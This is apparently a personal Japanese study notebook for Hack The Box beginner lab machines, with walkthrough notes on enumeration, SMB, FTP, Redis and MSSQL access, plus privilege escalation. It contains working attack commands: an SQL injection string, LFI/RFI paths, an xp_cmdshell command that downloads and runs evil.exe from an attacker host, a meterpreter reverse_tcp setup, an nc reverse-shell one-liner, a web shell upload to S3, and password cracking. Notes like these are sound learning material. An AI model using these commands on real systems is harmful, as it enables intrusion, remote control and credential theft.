##sudo nmap -sV -p- -sC -sS 10.129.55.125 -min-rate 5000

# Meow
- ICMP( Internet Control Message Protocol)echoとは、データを送って相手にも同じデータを遅らせることで、正常に通信できているか確認する（PING）
- telnet 10.10.10.10 でrootユーザーの場合、パスワード無しでログイン
# Fawn
　- FTP（File Transfer Protocol）リスニングポートは２１
　- SFTP (Secure File Transfer Protocol) 安全なFTP
　- vsftpd　LinuxなどのUNIX系OSでよく利用されるFTPサーバ
　- ftp -h ヘルプコマンド
　- anonymous FTPサーバーでアカウントなしでログイン
　- 230　FTPログイン成功（Login successful）
　- dir ls ファイル一覧コマンド
　- get 元ファイルパス　送り先パス　でファイルをダウンロード
# Dancing
　・SMB（Server Message Block）とは、Microsoft Windowsのネットワーク上においてファイルやプリンターの共有などを行なうための、Microsoft独自の通信プロトコル
　・445port SMB（microsoft-ds）
　・smbclient -hでヘルプ -L 10.10.10.10でホストのリストを一覧
　・smbclient //hostip/ディレクトリ　mbclient //10.129.94.140/Workshares  
Reddmer
　・Redis　 NoSQLデータベースの一つ（オープンソフトウェあ）
　・redis-cli -h 10.10.10.10で接続、infoでサーバ情報取得
　・keys * でキー一覧を表示、type キーの名前でキーのデータ型が分かる
　・select　データベース名

Appointment
　・SQL「Structured Query Language」、injection
　・HTTPS（443port）、HTTP（80port）
　・404not found　はエラーメッセージ
　・[1’ or ‘1’=’1’;-- ]最後にスペース、インジェクションコマンド
　・[#]はSQLのコメントアウト
Sequel
・mysql -h 10.10.10.10 -u root で接続できる
・select * FROM table名、use データベース名、show databases;、show tables;
Crocodile
・namp -sCオプションはnmapのオリジナルのスクリプトを使用して脆弱性診断を行う
　・vsftpdは、Linuxを含むUnixライクなシステム用のFTPサーバー
　・ftp 10.10.10.10 でユーザー名はanonymous
　・gobuster dir -u http://10.129.181.244/ -w /usr/share/dirbuster/wordlists/directory-list-
lowercase-2.3-medium.txt -x php
Responder
　・../../. ./../../../../../windows/system32/drivers/etc/hosts　LFI
　・//10.10.14.6/somefile　RFI
　・responder -Iでインタフェース指定、-iでIPアドレス指定
　　リスニングモードにし、ウェブページを更新すると、勝手にハッシュ値を探す
　・5985port evil-winrm -u Administrator -p 'badminton' -i 10.129.140.152
　・WinRMとは、Windows ServerのWindows PowerShellを遠隔から操作する機能
　・hash解析john --wordlist=/home/kali/Downloads/rockyou.txt /home/kali/hash
　・aws s3 cp --endpoint-url http://s3.thetoppers.htb   s3://thetoppers.htb/index.php /home/kali/Desktop/
　・aws s3 --endpoint=http://s3.thetoppers.htb cp ./Desktop/shell.php s3://thetoppers.htb
　・aws s3 ls   --endpoint-url http://s3.thetoppers.htb s3://thetoppers.htb
　　先に/etc/hostsにs3.thetoppersを登録しておかないとAWSにたどり着けない
　・PS C:\Users\denet> aws s3 cp s3://piyopiyo-s3-bucket/index.html .\Desktop\
download: s3://piyopiyo-s3-bucket/index.html to Desktop\index.html
　・MD5　https://hashtoolkit.com/decrypt-hash/?hash=2cb42f8734ea607eefed3b70af13bbd3

Archetype
　・smbclient -L //10.129.95.187　でsmb内をリストで表示　―Nでパスワード無し
　・smbclient //10.129.95.187/backups -Nでsmb: \> lsとなるからget filenameでダウンロード
　・mssqlclient.pyはMicrosoft SQL Server への認証された接続を確立するためインパケット
　・locateでmssqlclientを探し実行。
/usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth
　・kaliで目的のファイルがある階層に行き、python -m http.server 80で起動し
　　enable_xp_cmdshell、xp_cmdshell "powershell -c cd ../;  wget 10.10.15.189/evil.exe; ./evil.exe"
　　を実行するとファイルがダウンロードされる。
　　次に、metasploit1を起動し、multi/handler,set lhost set payload windows/meterpreter/reverse_tcpで
    Xp_cmdshell で./evil.exeを入力し実行すると接続が確立。
　　Upload winPEASx64で送り、shellで実行すると情報が出てくる。パスワードがあるので、evil-winrmを使って、evil-winrm -u Administrator -p 'MEGACORP_4dm1n!!' -i 10.129.95.187をすると実行。あとはファイルを探すだけ。たいていdesktopにある
Oopsie
　・proxyはWebトラフィックを傍受できる
　・HTMLソースを見て、別のページがないか探す
　・管理者アカウントのIDなどが分かったらCookieにIDを登録すると偽れる
　・gobusterでサブディレクトリを検索
　・大抵ウェブログイン情報は、www/html/の下位層の最初gobusterで見つからなかったところにある。今回の場合はdb.php
　・find / -group bugtracker でファイルを探す
　・SUID（Set User ID）とは、実行権のあるファイルに設定される特殊なアクセス権
Vaccine
　・zip2john -w パスワード付きＺｉｐをクラック、johnでハッシュ解析
　・sqlmap -r txt --os-shell　でtxtファイルには、burpsuiteのgetリクエストの内容をそのままにしたもの、手動でコピペするとerrorになるからファイルとして出力する
　・sqlmapを実行するとshellが返ってくる。Nc ―lvnp 1337で
Phpリバースシェルrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.186 1337 >/tmp/f　を実行すると確立する。
・python3 -c 'import pty;pty.spawn("/bin/bash");' を実行するとshellの形式になる
・index.phpファイルを探すかgrep -i -R “pass”でパスワードを探しsshにログイン
　Sudo -lを実行すると vi….がroot権限で実行されるので、
　Gtfobinsと検索し、shell,viに関連するコマンドを使用する。この時[i]を押して挿入モードにせず直接入力する。
Unified
　・「GTFOBins」は、ローカルのセキュリティ制限を回避するため利用できるバイナリのリストです。権限昇格
　・cronで自動起動設定、詳しくはネットで
　・/dev/nullは何もない場所で、ここにリンクすると出力や、ファイルをなかったことに
できる。-group bugtracker /dev/nullとすると、このコマンドの出力を捨てられる。

・/tmp/f;mkfifo /tmp/f;cat /tmp/fl/bin/sh-i 2>&1/nc 10.10.15.33 1337>/tmp/f　について
https://devlights.hatenablog.com/entry/2021/02/14/210033


Gobuster -xは拡張子を検索するオプションだけど、でてこないので、というより、今の環境だとVPN接続が切れて、エラーになるので、先にgobuster dir -u -wでファイル検索して、結果のファイル名をコピーして、リストにしてそのリストを設定した後、拡張子を設定する。

└─$ sudo gobuster vhost -u http://thetoppers.htb/ -w SecLists-master/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
[+] Url:             http://thetoppers.htb/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        SecLists-master/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
2023/08/12 09:50:52 Starting gobuster in VHOST enumeration mode
Found: s3.thetoppers.htb Status: 404 [Size: 21]

vhostでサブディレクりを探せる。dnsだと探せなかった。fuzzはhttp://http://thettoprs.htbとなってよくわからない
--append-domainとしないと、そのままwordリストのみのドメインで探すことになる。
-uはurlで

awscliがインストールできなかったがsudo apt --fix-broken install を実行したらインストールできた。
nikto の/var/lib/nikto/nikto.conf.defaultのFAILURESを20から２００に変更した。


